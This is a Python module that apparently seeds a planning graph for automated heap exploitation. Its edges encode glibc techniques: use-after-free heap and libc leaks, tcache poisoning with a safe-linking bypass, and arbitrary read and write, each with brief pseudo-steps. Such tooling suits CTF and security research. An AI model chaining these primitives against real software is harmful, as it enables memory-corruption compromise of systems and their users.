from core.graph.edges import (
    TechniqueEdge, StatePattern, HistoryCondition,
    TechniqueFootprint, Capability
)


SEED_EDGES = [

    TechniqueEdge(
        technique_id="uaf_view_heap_leak",
        pre_pattern=StatePattern(
            required_bugs={"potential_uaf"},
        ),
        history_condition=HistoryCondition(no_alloc_between=True),
        post_caps=[Capability(
            name="heap_leak", mode="single", max_bytes=8,
            address_space=["heap"], stability="stable",
        )],
        footprint=TechniqueFootprint(),
        cost=1.0,
        impl_steps=["free(slot)", "view(slot)", "recv(8)", "heap_base = leak << 12"],
    ),

    TechniqueEdge(
        technique_id="uaf_view_libc_leak",
        pre_pattern=StatePattern(
            required_bugs={"potential_uaf"},
        ),
        history_condition=HistoryCondition(no_alloc_between=True),
        post_caps=[Capability(
            name="libc_leak", mode="single", max_bytes=8,
            address_space=["libc"], stability="stable",
        )],
        footprint=TechniqueFootprint(),
        cost=1.5,
        impl_steps=["free(large_slot)", "view(large_slot)", "recv(8)", "libc.address = leak - offset"],
    ),

    TechniqueEdge(
        technique_id="uaf_double_free_arbitrary_alloc",
        pre_pattern=StatePattern(
            required_bugs={"potential_uaf"},
            required_caps={"heap_leak"},
        ),
        history_condition=HistoryCondition(),
        post_caps=[Capability(
            name="arbitrary_allocation", mode="bounded", max_bytes=8,
            address_space=["heap", "libc", "stack"],
            stability="fragile",
            constraints=["safe_linking_bypass"],
        )],
        footprint=TechniqueFootprint(
            consumes_tcache={0x30},
            needs_free_slots=1,
        ),
        cost=2.0,
        impl_steps=["edit(slot, p64(0)*2)", "free(slot)",
                     "edit(slot, p64(target ^ (pos >> 12)))",
                     "alloc(size, dummy)", "alloc(size, payload)"],
    ),

    TechniqueEdge(
        technique_id="arbitrary_alloc_to_arbitrary_read",
        pre_pattern=StatePattern(
            required_caps={"arbitrary_allocation"},
        ),
        history_condition=HistoryCondition(),
        post_caps=[Capability(
            name="arbitrary_read", mode="bounded", max_bytes=8,
            address_space=["heap", "libc", "stack"],
            stability="fragile",
        )],
        footprint=TechniqueFootprint(
            consumes_tcache=set(),
        ),
        cost=1.0,
        impl_steps=["edit(freed_slot, p64(target ^ (pos >> 12)))",
                     "alloc(size, dummy)", "alloc(size, data)", "view(slot) -> recv"],
    ),

    TechniqueEdge(
        technique_id="arbitrary_alloc_to_arbitrary_write",
        pre_pattern=StatePattern(
            required_caps={"arbitrary_allocation"},
        ),
        history_condition=HistoryCondition(),
        post_caps=[Capability(
            name="arbitrary_write", mode="bounded", max_bytes=8,
            address_space=["heap", "libc", "stack"],
            stability="fragile",
        )],
        footprint=TechniqueFootprint(
            consumes_tcache=set(),
        ),
        cost=1.0,
        impl_steps=["edit(freed_slot, p64(target ^ (pos >> 12)))",
                     "alloc(size, dummy)", "alloc(size, payload)"],
    ),
]


def get_seed_edges() -> list:
    return list(SEED_EDGES)
